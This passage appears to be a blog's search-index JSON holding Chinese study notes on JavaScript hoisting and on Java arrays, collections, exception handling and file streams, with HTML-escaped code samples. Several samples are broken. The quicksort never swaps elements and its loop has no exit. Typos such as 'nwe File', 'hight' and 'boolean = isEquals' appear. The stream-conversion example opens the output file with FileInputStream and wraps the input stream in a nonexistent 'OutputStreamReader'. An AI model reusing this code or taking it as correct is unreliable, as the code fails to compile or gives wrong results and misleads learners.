**函数提升优先级高于变量提升，且不会被同名变量声明时覆盖，但是会被变量赋值后覆盖**  - ```js  if(!(b in window))&#123;        var b =1  &#125;  console.log(b)    //undefined\n\n​        var没有块级作用域，不管在函数内部还是外部，都会变量提升到window    \n​        var定义的全局变量&#x3D;&#x3D;》undefined，添加为window的属性\n​        b in window &#x3D;&#x3D; true\n\n&#96;&#96;&#96;jsvar c &#x3D; 1function c(c){console.log(c)var c &#x3D; 3}c(2)       &#x2F;&#x2F;报错相当于```jsvar cfunction c(c)&#123;    console.log(c)    var c = 3&#125;c=1c(2)       //报错,提示c不是一个function\n\n函数提升优先级高于变量提升，且不会被同名变量声明时覆盖，但是会被变量赋值后覆盖\n\n","categories":["JavaScript"],"tags":["执行上下文"]},{"title":"Java基础（一）：数组","url":"/2023/01/15/Java%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9A%E6%95%B0%E7%BB%84/","content":"Java中数组的使用一维数组public class ArrayTest&#123;    public static void main(String[] args)&#123;        //1 一维数组的初始化        //1.1 静态初始化        int[] ids = new int[]&#123;1001,1002,1003,1004&#125;;        int[] ids = &#123;1001,1002,1003,1004&#125;; // 类型推断        //1.2 动态初始化        String[] names = new String[5];        //1.3 错误写法        //int[] arr1 = new int[];        //int[5] arr2 = new int[5];        //int[] arr3 = new int[3]&#123;1,2,3&#125;;                //2 数组长度        System.out.println(names.length);    &#125;&#125;\n\n\n一维数组元素默认初始化值\n数组元素是整型：0\n数组元素是浮点型：0.0\n数组元素是char型：0或’\\u0000’，而非’0’\n数组元素是boolean型：false\n数组元素是引用数据类型（如String）：null\n\n\n\n二维数组public class ArrayTest&#123;    public static void main(String[] args)&#123;        //1 二维数组的声明和初始化        //1.1 静态初始化        int[][] arr1 = new int[][]&#123;&#123;1,2,3&#125;,&#123;4,5&#125;,&#123;6,7,8&#125;&#125;;        int[][] arr1 = &#123;&#123;1,2,3&#125;,&#123;4,5&#125;,&#123;6,7,8&#125;&#125;; // 类型推断        //1.2 动态初始化        String[][] arr2 = new String[3][2];  //方法一        String[][] arr2 = new String[3][];   //方法二        //1.3 错误写法        //String[][] arr2 = new String[][4];        //String[4][3] arr2 = new String[][];        //String[][] arr2 = new String[3][];        //int[][] arr1 = new int[4][3]&#123;&#123;1,2,3&#125;,&#123;4,5&#125;,&#123;6,7,8&#125;&#125;;    &#125;&#125;\n\n\n二维数组元素默认初始化值\n针对于初始化方法一：String[][] arr2 = new String[3][2]; \n外层元素初始化值为：地址值\n内层元素初始化值为：与一维数组元素默认初始化值相同\n\n\n针对于初始化方二：String[][] arr2 = new String[3][]; \n外层元素初始化值为：null\n内层元素初始化值为：不能调用，否则报错\n\n\n\n\n\n数组中涉及的常见算法\n\n数组元素的赋值（杨辉三角、回形数等）\n求数值型数组中元素的最大值、最小值、平均数、总和等\n数组的复制、反转、查找（线性查找、二分法查找）\n数组元素的排序算法\n\n\n算法一：数组赋值随机数定义一个int型的一维数组，包含10个元素，分别赋值、一些随机整数，然后求出所有元素的最大值、最小值，和值，平均值，并输出。\n要求：所有随机数都是两位数。即[10,99]\n\nMath.random(): [0.0,1)\n*Math.random()90: [0.0,90.0)\n**(int)(Math.random()90):* [0,89]\n**(int)(Math.random()90)+10:* [10,99]\n公式：获取[a,b]范围的随机数：(int)(Math.random()*(b-a+1))+a\n\npublic class ArrayTest&#123;    public static void main(String[] args)&#123;        int[] arr = new int[10];                for(int i=0;i&lt;arr.length;i++)&#123;            arr[i]=(int)(Math.random()*(99-10+1)+10);        &#125;        //最大值、最小值，和值，平均值        //略    &#125;&#125;\n\n数组反转public class ArrayTest&#123;    public static void main(String[] args)&#123;        //法一        for(int i=0;i&lt;arr.length/2;i++)&#123;            String temp = arr[i];            arr[i] = arr[arr.length-i-1];            arr[arr.length-i-1] = temp;        &#125;        //法二        for(int i=0,j=arr.length-1;i&lt;j;i++,j--)&#123;            String temp = arr[i];            arr[i] = arr[j];            arr[j] = temp;        &#125;    &#125;&#125;\n\n数组查找线性查找String dest = &quot;BB&quot;;for(int i=0;i&lt;arr.length;i++)&#123;    if(dest.equals(arr[i]))&#123;        System.out.println(&quot;找到指定元素，位置为：&quot;+i);        break;    &#125;&#125;\n\n二分查找前提：所查找的数组必须是有序的\nint[] arr = new int[]&#123;-98,-34,2,34,66,79,105,210,333&#125;;int dest = -34;int head = 0;int end = arr.length-1;while(head&lt;=end)&#123;    int middle = (head+end)/2;    if(dest == arr[middle])&#123;        System.out.println(&quot;找到指定元素，位置为：&quot;+middle);        break;    &#125;else if(arr[middle]&gt;dest)&#123;        end = middle-1;    &#125;else&#123; //arr[middle]&lt;dest        head = middle+1;    &#125;&#125;\n\n数组排序冒泡排序\n相邻元素两两比较，将最大元素选出来\n\nint[] arr =  new int[]&#123;43,32,76,-98,0,64,33,-21,32,99&#125;;for(int i = 0;i &lt; arr.length - 1;i++)&#123;    for(int j = 0;j &lt; arr.length - 1 - i;j++)&#123;        if(arr[j]&gt;arr[j+1])&#123;            int temp = arr[j];            arr[j]=arr[j+1];            arr[j+1]=temp;        &#125;    &#125;&#125;\n\n快速排序\n时间复杂度O(nlog(n))\n\nprivate static void subSort(int[] data,int start,int end)&#123;    if(start&lt;end)&#123;        int base = data[start];        int low = start;        int high = end+1;        while(true)&#123;            while(low &lt; end &amp;&amp; data[++low] - base &lt;= 0)                ;            while(high &gt; start &amp;&amp; data[--high] - base &gt;=0)                ;            swap(data,start,high);                        subSort(data,start,high-1);//递归调用            subSort(data,hight+1,end);        &#125;    &#125;&#125;\n\nArrays工具类的使用import java.util.Arrays;public class ArraysTest&#123;    public static void main(String[] args)&#123;        //1. boolean equals(int[] a,int[] b) 判断两个数组是否相等        int[] arr1 = new int[]&#123;1,2,3,4&#125;;        int[] arr2 = new int[]&#123;1,3,2,4&#125;;        boolean = isEquals = Arrays.equals(arr1,arr2);                //2. String toString(int[] a) 输出数组信息        System.out.println(Arrays.toString(arr1));                //3. void fill(int[] a,int val) 将指定值填充到数组之中        Arrays.fill(arr1,10);                //4. void sort(int[] a) 对数组进行排序        Arrays.sort(arr2);                //5. int binarySearch(int[] a,int key) 二分查找（找到返回下标，没找到返回负数）        int index = Arrays.binarySearch(arr,3);            &#125;&#125;\n\n数组中的常见异常\n数组角标越界的异常：ArrayIndexOutOfBoundsException\n空指针异常：NullPointerException\n\n","categories":["Java基础"],"tags":["数组","排序"]},{"title":"Java基础（七）：集合","url":"/2023/02/02/Java%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%83%EF%BC%89%EF%BC%9A%E9%9B%86%E5%90%88/","content":"集合概述\n集合、数组都是对多个数据进行存储操作的结构，检测java容器\n数组在存储多个数据方面的特点：\n一旦初始化后，其长度就确定了\n一旦定义后，其元素类型也确定了，只能操作指定类型数据\n对于添加、删除、插入数据等操作不变，且效率不高\n有序、可重复，对于无序、不可重复的需求不能满足\n\n\nJava集合可分为Collection和Map两种体系\nCollection接口：单列数据，定义了存取一组对象的方法的集合\nList：元素有序、可重复的集合    —-&gt; “动态”数组\nArrayList、LinkedList、Vector\n\n\nSet：元素无序、不可重复的集合  —-&gt;高中学的“集合”\nHashSet、LinkedHashSet、TreeSet\n\n\n……\n\n\nMap接口：双列数据，保存具有映射关系”key-value对”的集合   —&gt; 高中函数：y &#x3D; f(x) ，一个key只能对应一个value\nHashMap、LinkedHashMap、TreeMap、Hashtable、Properties\n\n\n\n\n\nCollectionCollection接口中的方法\nadd(Object e)：将元素e添加到集合中（类型任意）\n\naddAll(Collection coll)：将coll集合中的元素添加到当前集合中\n\nsize()：获取元素个数\n\nclear()：清空集合元素\n\nisEmpty()：判断当前集合是否为空\n\ncontains(Object obj)：判断当前集合中是否包含obj。调用的是obj对象所在类的equals()，通常自定义的类需要重写equals()\n\ncontainsAll(Collection coll)：判断coll中的所有元素是否都存在于当前集合中。调用的是obj对象所在类的equals()，通常自定义的类需要重写equals()\n\nremove(Object obj)：从当前集合移除obj元素，也需要调用equals()。\n\nremoveAll(Collection coll)：从当前集合移除coll中所有的元素，也需要调用equals()。（差集）\n\nretainAll(Collection coll)：获取当前集合和coll集合的交集，并返回给当前集合（交集）\n\nequals(Object obj)：要想返回true，需要当前集合和形参集合的元素都相同。（顺序不同也不相同）\n\nhashCode()：返回当前对象的哈希值\n\ntoArray()：将集合转换为数组\n\nArray.asList()：将数组转换为集合\n\n\niterator()：返回Iterator接口的实例，用于遍历集合元素。\n集合元素的遍历操作，使用迭代器Iterator接口\nCollection coll = new ArrayList();coll.add(123);coll.add(456);coll.add(new Person(&quot;Jerry&quot;,20));coll.add(false);Iterator iterator = coll.iterator();while(iterator.hasNext())&#123;    //next():①指针下移 ②将下移以后集合位置上的元素返回    System.out.println(iterator.next());&#125;\n\n错误写法：\nCollection coll = new ArrayList();coll.add(123);coll.add(456);coll.add(new Person(&quot;Jerry&quot;,20));coll.add(false);Iterator iterator = coll.iterator();//此时指针已经下移了，每循环一次指针下移两次while((iterator.next())!=null)&#123;    System.out.println(iterator.next());&#125;\n\nCollection coll = new ArrayList();coll.add(123);coll.add(456);coll.add(new Person(&quot;Jerry&quot;,20));coll.add(false);//死循环，不断输出第一个元素while(coll.iterator().hasNext())&#123;    System.out.println(iterator.next());&#125;\n\n迭代器的remove()方法：可以在遍历的时候，删除集合中的元素，此方法不同于集合直接调用remove()。如果还未调用next()或在上一次调用next方法之后已经调用了remove方法，再调用remove都会报IllegalStateException\nCollection coll = new ArrayList();coll.add(123);coll.add(456);coll.add(new Person(&quot;Jerry&quot;,20));coll.add(new String(&quot;Tom&quot;));coll.add(false);Iterator iterator = coll.iterator();while(iterator.hasNext())&#123;    Object obj = iterator.next();    if(&quot;Tom&quot;.equals(obj))&#123;        iterator.remove();    &#125;&#125;\n\n使用foreach循环（增强for循环），遍历集合、数组\n内部仍然调用了迭代器\nCollection coll = new ArrayList();coll.add(123);coll.add(456);coll.add(new Person(&quot;Jerry&quot;,20));coll.add(new String(&quot;Tom&quot;));coll.add(false);//for(集合元素的类型 局部变量：集合对象)for(Object obj:coll)&#123;    System.out.println(obj);&#125;\n\nint[] arr = new int[]&#123;1,2,3,4,5,6&#125;;for(int i:arr)&#123;    System.out.println(i);&#125;\n\nList接口\n通常使用List替代数组\n\nList集合类中元素有序、可重复\n\n面试题：ArrayList、LinkedList、Vector三者的异同？\n\n相同：三个类都实现了List接口，存储数据的特点相同\n不同：\nArrayList：作为List接口的主要实现类；线程不安全的，效率高；底层使用Object[]存储\nLinkedList：对于频繁的插入、删除操作，使用此类效率比ArrayList高；底层使用双向链表存储\nVector：作为List接口的古老实现类；线程安全的，效率低；底层使用Object[]存储\n\n\n\n\n\nList接口中常用方法\nadd(int index,Object e)：在index位置插入e元素\n\naddAll(int index,Collection e)\n\nObject get(int index)\n\nObject set(int index,Object e)\n\nList subList(int fromIndex, int toIndex)\n\n增：add(Object e)\n\n删：remove(int index) / remove(Object obj)\n\n改：set(int index,Object e)\n\n查：get(int index)\n\n插：add(int index,Object e)\n\n长度：size()\n\n遍历：\n\nIterator迭代器\nIterator iterator = list.iterator();while(iterator.hasNext())&#123;    System.out.println(iterator.next());&#125;\n\n增强for循环\nfor(Object obj:list)&#123;    System.out.println(obj);&#125;\n\n普通的循环\nfor(int i=0;i&lt;list.size();i++)&#123;    System.out.println(list.get(i));&#125;\n\n\n\nSet接口\n存储无序的、不可重复的数据\n无序性：不等于随机性。存储的数据在底层数组中并非按照数组索引的顺序添加，而是根据数据的哈希值决定。\n不可重复性：保证添加的元素按照equals()判断时，不能返回true，即：相同的元素只能添加一个。\n\n\nHashSet：作为Set接口的主要实现类；线程不安全的；可以存储null值；底层是数组+链表的结构。\nLinkedHashSet：作为HashSet的子类；遍历其内部数据时，可以按照添加的顺序遍历；对于频繁的遍历操作，LinkedHashSet效率高于HashSet\n\n\nTreeSet：可以按照添加对象的指定属性进行排序\n添加元素的过程（以HashSet为例）：\n向HashSet中提添加元素a，首先调用元素a所在类的hashCode()方法，计算元素a的哈希值，此哈希值接着通过某种算法计算出HashSet底层数组中的存放位置（即：索引位置），判断数组此位置上是否已经有元素：\n如果此位置上没有其它元素，则元素a添加成功  —-&gt;情况1\n如果此位置上有其它元素（或以链表形式存在的多个元素），则比较元素a与元素b的hash值：\n如果hash值不相同，则元素a添加成功  —-&gt;情况2\n如果hash值相同，进而需要调用元素a所在类的equals()方法：\nequals()返回true，元素a添加失败\nequals()返回false，则元素a添加**成功 ** —-&gt;情况3\n\n\n\n\n\n\n对于添加成功的情况2和情况3而言：元素a与已经存在指定索引位置上数据以链表的方式存储。jdk7：元素a放到数组中，指向原来的元素；jdk8：原来的元素在数组中，指向元素a。（七上八下）\n要求：\n向Set中添加的数据，其所在的类一定要重写hashCode()和equals()\n重写的hashCode()和equals()尽可能保持一致性：相等的对象必须具有相等的散列码\n对象中用作equals()方法比较的属性，都应该用来计算hashCode值\n\n\n\n\n\nLinkedHashSet\nLinkedHashSet作为HashSet的子类，在添加数据的同时，每个数据还维护了两个引用，记录此数据前一个数据和后一个数据\n优点：对于频繁的遍历操作，LinkedHashSet效率高于HashSet\n\nTreeSet\n向TreeSet中添加的数据，要求是相同类的对象。（因为要按照对象的某个属性进行排序）\n两种排序方式：\n自然排序：实现Comparable接口\n比较两个对象是否相同的标准为：compareTo()返回0，不再是equals()。\n\n\n定制排序：实现Comparator抽象类\n比较两个对象是否相同的标准为：compare()返回0，不再是equals()。\n\n\n\n\n\nMap\nMap结构的理解\n\nMap中的key：无序的、不可重复的，使用Set存储所有的key。 —&gt;key所在的类要重写equals()和hashCode() （以HashMap为例）\nMap中的value：无序的、可重复的，使用Collection存储所有的value。 —&gt;value所在的类要重写equals()\n一个键值对：key-value构成了一个Entry对象。\nMap中的entry：无序的、不可重复的，使用Set存储所有的entry。\n\n\nHashMap：作为Map的主要实现类；线程不安全的，效率高；存储null的key和value。\n\nLinkedHashMap：保证在遍历map元素时，可以按照添加的顺序实现遍历。原因：在原有的HashMap底层结构基础上，添加了一对指针，指向前一个和后一个元素。对于频繁的遍历操作，此类效率高于HashMap。\n\n\nTreeMap：保证按照添加的key-value对进行排序，实现排序遍历。此时考虑key的自然排序或定制排序。底层使用的是红黑树。\n\nHashtable：作为Map的古老实现类；线程安全的，效率低；不能存储null的key和value\n\nProperties：常用来处理配置文件。key和value都是String类型。\n\n\nHashMap的底层：\n\n数组+链表（jdk 7及之前）\n数组+链表+红黑树（jdk 8）\n\n\n面试题：\n\nHashMap的底层实现原理？\n以jdk7为例说明：\nHashMap map = new HashMap()：在实例化以后，底层创建了长度是16的一维数组Entry[] table。\nmap.put(key1,value1)：首先调用key1所在类的hashCode()计算key1哈希值，此哈希值经过某种算法计算以后，得到在Entry数组中的存放位置。\n\n如果此位置为空，此时的key1-value1添加成功；   —&gt;情况1\n如果此位置不为空（意味着此位置上存在一个或多个数据（链表形式）），比较key1和已存在数据的哈希值：\n如果key1哈希值和已存在数据的哈希值都不同，此时key1-value1添加成功；   —&gt;情况2\n如果key1哈希值和已存在的某一个数据（key2-value2)的哈希值相同，继续比较：调用key1所在类的equals()方法，比较：\n如果equals()返回false：此时key1-value1添加成功；   —&gt;情况3\n如果equals()返回true：使用value1替换value2（修改覆盖），此时key1-value1添加成功；\n\n\n\n\n\n关于情况2和情况3：此时key1-value1和原来的数据以链表的方式存储\n在不断的添加过程中，会涉及到扩容问题，默认的扩容方式：扩容为原来容量的2倍，并将原有的数据复制过来。\njdk8相较于jdk7底层实现方面的不同：\n\nnew HashMap()：底层没有创建一个长度为16的数组\n\njdk8底层的数组是：Node[]，而非Entry[]\n\n首次调用put()方式时，底层创建长度为16的数组\n\njdk7底层结构：数组+链表。jdk8底层结构：数组+链表+红黑树。\n当数组的某一个索引位置上的元素以链表形式存在的数据个数&gt;8，且当前数组长度&gt;64时，此时此索引位置上的所有数据改为使用红黑树存储。（提高查找效率）\n\n\n\nHashMap和Hashtable的异同？\n\nCurrentHashMap与Hashtable的异同？\n\n\n\n\nMap中常用方法\nObject put(Object key,Object value)：添加或修改\n\nvoid putAll(Map m)\n\nObject remove(Object key)：移除指定key的key-value对，并返回value\n\nvoid clear()\n\nObject get(Object key)\n\nboolean containsKey(Object key)\n\nboolean containsValue(Object key)\n\nint size()\n\nboolean isEmpty()\n\nboolean equals(Object obj)：判断当前map和参数对象obj是否相等\n\n元视图操作的方法（遍历相关）：\n\nSet keySet()：返回所有key构成的Set集合\nSet set = map.keySet();Iterator iterator = set.iterator();while(iterator.hasNext())&#123;    System.out.println(iterator.next());&#125;\n\nCollection values()：返回所有value构成的Collection 集合\nCollection  values = map.values();for(Object obj : values)&#123;    System.out.println(obj);&#125;\n\nSet entrySet()：返回所有key-value对构成的Set集合\n遍历key-value对\nSet set = map.entrySet();Iterator iterator = set.iterator();while(iterator.hasNext())&#123;    Object obj = iterator.next();    Map.Entry entry = (Map.Entry)obj;    System.out.println(entry.getKey()+&quot;--&gt;&quot;+entry.getValue());&#125;\n\nSet keySet = map.keySet();Iterator iterator = keySet.iterator();while(iterator.hasNext())&#123;    Object key = iterator.next();    Object value = map.get(key);    System.out.println(key+&quot;--&gt;&quot;+value);&#125;\n\n\n\nTreeMap\n向TreeMap中添加key-value，要求key必须是由同一个类创建的对象（因为要按照key进行排序：自然排序、定制排序）\n\nProperties\n常用来处理配置文件。key和value都是String类型。\nProperties pros = new Properties();FileInputStream fis = new FileInputStream(&quot;jdbc.properties&quot;);//配置文件pros.load(fis);String name = pros.getProperty(&quot;name&quot;);String password = pros.getProperty(&quot;password&quot;);fis.close();\n\nCollections工具类\nCollections：操作Collection和Map的工具类\n\n面试题：Collection和Collections的区别？\n\nCollection是接口\nCollections是类\n……\n\n\n常用方法：\n\nreverse(List)：反转List中元素\n\nshuffle(List)：对List集合元素进行随机排序\n\nsort(List)\n\nsort(List,Comparator)\n\nswap(List,int,int)\n\nint frequency(Collection,Object)：返回集合中指定元素出现的次数\n\nvoid copy(List dest,List src)：将src中的内容复制到dest中\n\nCollections类中提供了多个synchronizedXxx()方法，该方法可使将指定集合包装成线程同步的集合，从而可以解决多线程并发访问集合时的线程安全问题\nList list = Collections.synchronizedList(list);\n返回的list即为线程安全的\n\n\n\n\n","categories":["Java基础"],"tags":["集合"]},{"title":"Java基础（三）：异常处理","url":"/2023/01/19/Java%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%89%EF%BC%89%EF%BC%9A%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/","content":"异常概述\n异常事件分类\n\nError：Java虚拟机无法解决的严重问题。如：JVM系统内部错误、资源耗尽等严重情况。一般不编写针对性的代码进行处理。\n栈溢出：java.lang.StackOverflowError\n堆溢出：java.lang.OutOfMemoryError\n\nException：其它因编程错误或偶然的外在因素导致的一般性问题，可以使用针对性的代码进行处理。\n空指针访问、试图读取不存在的文件、网络连接中断、数组角标越界\n\n\n\n异常的体系结构\n\njava.lang.Throwable\njava.lang.Error：一般不编写针对性的代码进行处理\njava.lang.Exception：可以进行异常的处理\n编译时异常（checked）\nIOException\nFileNotFoundExcepiton\n\n\nClassNotFoundException\n\n\n运行时异常（unchecked）\nNullPointerException\nArrayIndexOutOfBoundsException\nClassCastException 类型转换异常\nNumberFormatException\nInputMismatchException\nArithmaticException 算数异常\n\n\n\n\n\n\n\n\n面试题：常见的异常有哪些？举例说明。\n\n\n异常处理机制\n抓抛模型：\n\n抛：程序正常执行的过程中，一旦出现异常，就会在异常代码处生成一个对应异常类的对象，并将此对象抛出，一旦抛出对象后，其后的代码就不再执行。\n关于异常对象的产生：系统自动生成的异常对象、手动的生成一个异常对象并抛出（throw）\n\n抓：可以理解为异常的处理方式：①try-catch-finally ②throws\n\n\n\n\ntry-catch-finallytry&#123;    //可能出现异常的代码&#125;catch(异常类型1 变量名1)&#123;    //处理异常的方式1&#125;catch(异常类型2 变量名2)&#123;    //处理异常的方式1&#125;catch(异常类型3 变量名3)&#123;    //处理异常的方式1&#125;...finally&#123;    //一定会执行的代码&#125;\n\nString str = &quot;123&quot;;str = &quot;abc&quot;;try&#123;    int num = Integer.parseInt(str);&#125;catch(NumberFormatException e)&#123;    System.out.println(e.getMessage());&#125;catch(NullPointerException e)&#123;    e.printStackTrace();&#125;catch(Exception e)&#123;    e.printStackTrace();&#125;\n\n\nfinally是可选的\n\nfinally中声明的是一定会被执行的代码。即使catch中又出现异常了，try中又return语句，catch中又return语句等情况。\ntry&#123;    int a = 10;    int b = 0;    System.out.println(a/b);&#125;catch(ArithmeticException e)&#123;    int[] arr = new int[10];    System.out.println(arr[10]);   //catch中又出现异常&#125;catch(Exception e)&#123;    e.printStackTrace();&#125;finally&#123;    System.out.println(&quot;---------&quot;)  //最终会输出&#125;\n\npublic int method()&#123;    try&#123;        int[] arr = new int[10];        System.out.println(arr[10]);        return 1;    &#125;catch(ArrayIndexOutOfBoundsException e)&#123;        e.printStackTrace();        return 2;    &#125;finally&#123;        System.out.println(&quot;---------&quot;)  //最终会输出    &#125;&#125;int num = method();System.out.println(num);\n\nfinally使用场景\n\n数据库连接、输入输出流、网络编程Socket等资源，JVM是不能自动回收的，需要自己手动进行资源的释放，此时的资源释放，就需要声明在finally中。\n\n\n\n\n在try结构中声明的变量，出了try结构以后就不能再被调用\n\ntry-catch-finally结构可以相互嵌套\n\n使用try-catch-finally处理编译时异常，使得程序再编译时就不再报错，但是运行时仍可能报错。相当于将一个编译时可能出现的异常延迟到运行时出现。\n\n开发中，由于运行时异常比较常见，通常不针对运行时异常编写try-catch-finally；针对于编译时异常，一定要考虑异常的处理。\n\n\nthrows+异常类型public static void main(String[] args)&#123;    try&#123;        method2();    &#125;catch(IOException e)&#123;        e.printStackTrace();    &#125;&#125;public static void method1() throws IOException&#123;    method1();&#125;public static void method1() throws FileNotFoundException,IOException&#123;    ...&#125;\n\n\ntry-catch-finally：真正的将异常给处理掉了\nthrows的方式只是将异常抛给了方法的调用者，并没有真正将异常处理掉。\n\n子类重写的方法抛出的异常类型不大于父类被重写的方法抛出的异常类型\n\n开发中如何选择try-catch-finally和throw？\n\n如果父类中被重写的方法没有throws方式处理异常，则子类重写的方法也不能使用throws，意味着必须使用try-catch-finally\n执行的方法s中，先后又调用了另外的几个方法，这几个方法是递执行的，建议这几个方法使用throws，而执行的方法a可以考虑使用try-catch-finally\n\n\n\n手动抛出异常public void regist(int id)&#123;    if(id&gt;0)&#123;        this.id = id;    &#125;else&#123;        //手动抛出异常        throw new RuntimeException(&quot;您输入的数据非法！&quot;);    &#125;&#125;\n\npublic static void main(String[] args)&#123;    try&#123;        Student s = new Student();        s.regist(-1001);        System.out.println(s);    &#125;catch(Exception e)&#123;        System.out.println(e.getMessage());    &#125;&#125;public void regist(int id) throws Exception&#123;    if(id&gt;0)&#123;        this.id = id;    &#125;else&#123;        //手动抛出异常        throw new Exception(&quot;您输入的数据非法！&quot;);    &#125;&#125;\n\n自定义异常类\n如何自定义异常类：\n\n继承于现有的异常结构：RuntimeException、Exception\n提供全局常量：serialVersionUID\n\npublic class MyException extends RuntimeException&#123;    static final long serialVersionUID = -789783274892323L;    public MyException()&#123;            &#125;    public MyException(String msg)&#123;        super(msg);    &#125;&#125;\n\n","categories":["Java基础"],"tags":["异常处理"]},{"title":"Java基础（九）：IO流","url":"/2023/02/04/Java%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B9%9D%EF%BC%89%EF%BC%9AIO%E6%B5%81/","content":"File类的使用\nFile类的一个对象，代表一个文件或一个文件目录\nFile类声明在java.io下\nFile类常用方法：\nString getAbsolutePath()\nString getPath()\nString getName()\nString getParent()：获取上层文件目录路径，若无，返回null\nlong length()：获取文件长度（即：字节数）。不能获取目录的长度\nlong lastModfied()：获取最后一次的修改时间，毫秒值\nString[] list()：获取指定目录下所有文件或者文件目录的名称数组\nFile[] listFile()：获取指定目录下所有文件或者文件目录的File数组\nboolean renameTo(File dest)：把文件重命名为指定的文件路径。file1.renameTo(file2)要想返回true，需要保证file1在硬盘中存在，file2不存在。\nboolean isDirectory()\nboolean isFile()\nboolean exists()\nboolean canRead()\nboolean canWrite()\nboolean isHidden()\nboolean createNewFile()\nboolean mkdir()：创建文件目录。如果此文件目录存在，则不创建；如果此文件目录的上层目录不存在，则也不创建；\nboolean mkdirs()：创建文件目录。如果此文件目录存在，则不创建；如如果此文件目录的上层目录不存在，一并创建\nboolean delete()\n\n\nFile类中未世纪到写入或读取文件内容的操作，如果需要读取或写入文件内容，必须使用IO流来完成。File类的对象常会作为参数传递到流的构造器中，指明读取或写入的”终点”。\n\nIO流原理及流的分类\n按操作数据单位的不同分为：字节流(8 bit)（图片视频等非文本数据）、字符流(16 bit)（char文本数据）\n\n按数据流的流向不同分为：输入流、输出流\n\n按流的角色的不同分为：节点流、处理流\n\n\n\n（抽象基类）\n字节流\n字符流\n\n\n\n输入流\nInputStream\nReader\n\n\n输出流\nOutputStream\nWriter\n\n\n\nJava的IO流共涉及40多个类，都是从如上4个抽象基类派生的。\n\n\n\n节点流（文件流）FileReaderFileReader fr = null;try&#123;    File file = new File(&quot;hello.txt&quot;);    fr = new FileReader(file);    //read():返回读入的一个字符，如果达到文件末尾，返回-1    int data = fr.read();    while(data != -1)&#123;        System.out.print((char)data);        data = fr.read();    &#125;&#125;catch(IOException e)&#123;    e.printStackTrace();&#125;finally&#123;    try&#123;        if(fr!=null)        \tfr.close();    &#125;catch(IOException e)&#123;        e.printStackTrace();    &#125;&#125;\n\nFileReader fr = null;try&#123;    File file = new File(&quot;hello.txt&quot;);    FileReader fr = new FileReader(file);    //read():返回读入的一个字符，如果达到文件末尾，返回-1    int data = fr.read();    while((data = fr.read()) != -1)&#123;        System.out.print((char)data);    &#125;&#125;catch(IOException e)&#123;    e.printStackTrace();&#125;finally&#123;    try&#123;        if(fr!=null)        \tfr.close();    &#125;catch(IOException e)&#123;        e.printStackTrace();    &#125;&#125;\n\n\n为了保证流资源一定可以执行关闭操作，需要使用try-catch-finally处理\n读入的文件一定要存在，否则就会报FileNotFoundException\n使用read的重载方法\n\nFile file = new File(&quot;hello.txt&quot;);FileReader fr = new FileReader(file);//read(char[] cbuf):返回每次读入cbuf数组中的字符的个数。如果达到文件末尾，返回-1char[] cbuf = new char[5];int len;while((len = fr.read(cbuf)) != -1)&#123;    //方式一：    for(int i = 0;i&lt;len;i++)&#123;        System.out.print(cbuf[i]);    &#125;    //方式二：    String str = new String(cbuf,0,len);    System.out.print(str);&#125;fr.close();\n\nFileWriterFile file = new File(&quot;hello.txt&quot;);FileWriter fw = new FileWriter(file);fw.write(&quot;I have a dream!\\n&quot;);fw.write(&quot;You need to have a dream!&quot;);fw.close();\n\n\n输出操作对应的File可以不存在的。\n如果不存在：在输出过程中，会自动创建此文件。\n如果存在：\n如果流使用的构造器是FileWriter(file,false) &#x2F; FileWriter(file)：对原有文件进行覆盖\n如果流使用的构造器是FileWriter(file,true) 不会对原有文件覆盖，在原有文件基础上进行追加\n\n\n\n\n\nFileInputStream\n对于文本文件(.txt,.java,.c,.cpp)，使用字符流处理\n对于非文本文件(.jpg,.mp3,.mp4,.avi,.doc,.ppt,…)，使用字节流处理\n\nFile file = new File(&quot;hello.txt&quot;);FileInputStream fis = new FileInputStream(file);byte[] buffer = new byte[5];int len;while((len = fr.read(buffer)) != -1)&#123;    String str = new String(cbuf,0,len);    System.out.print(str);&#125;fis.close();\n\nFileOutputStreamFile srcFile = nwe File(&quot;爱情与友情.jpg&quot;);File destFile = nwe File(&quot;爱情与友情2.jpg&quot;);FileInputStream fis = new FileInputStream(srcFile);FileOutputStream fos = new FileOutputStream(destFile);byte[] buffer = new byte[1024];int len;while((len = fis.read(buffer))!=-1)&#123;    fos.write(buffer,0,len);&#125;fos.close();fis.close();\n\n缓冲流(处理流的一种)\n作用：提高流的读写效率\n\n原因：内部提供了一个缓冲区（8192个字节）\n\n\n处理流是套在节点流外面的\n\nBufferedInputStream\n\nBufferedOutputStream\n\nBufferedReader\n\nBufferedWriter\nFile srcFile = nwe File(&quot;爱情与友情.jpg&quot;);File destFile = nwe File(&quot;爱情与友情2.jpg&quot;);FileInputStream fis = new FileInputStream(srcFile);FileOutputStream fos = new FileOutputStream(destFile);BufferedInputStream bis = new BufferedInputStream(fis);BufferedOutputStream bos = new BufferedOutputStream(fos);byte[] buffer = new byte[10];int len;while((len = bis.read(buffer))!=-1)&#123;    bos.write(buffer,0,len);&#125;//先关闭外层的流，再关闭内存的流bos.close();bis.close();//关系外层流的同时，内层流也会自动的进行关闭。所以内存流的关闭可以省略。fos.close();fis.close();\n\n转换流（处理流的一种）\n作用：提供了字节流和字符流之间的转换\n\n转换流：属于字符流\n\nInputStreamReader：将一个字节的输入流转换为字符的输入流\n\nOutputStreamWriter：将一个字符的输出流转换为字节的输出流\nFileInputStream fis = new FileInputStream(&quot;dbcp.txt&quot;);//参数2指明了字符集，具体使用那个字符集，取决于dbcp.txt保存时使用的字符集InputStreamReader isr = new InputStreamReader(fis,&quot;UTF-8&quot;);char[] cbuf = new char[20];int len;while((len = isr.read(cbuf) != -1)&#123;    String str = new String(cbuf,0,len);    System.out.print(str);&#125;isr.close();\n\nFile file1 = new File(&quot;dbcp.txt&quot;);File file2 = new File(&quot;dbcp_gbk.txt&quot;);FileInputStream fis = new FileInputStream(file1);FileInputStream fos = new FileInputStream(file2);InputStreamReader isr = new InputStreamReader(fis,&quot;UTF-8&quot;);OutputStreamReader osw = new OutputStreamReader(fis,&quot;gbk&quot;);char[] cbuf = new char[20];int len;while((len = isr.read(cbuf) != -1)&#123;    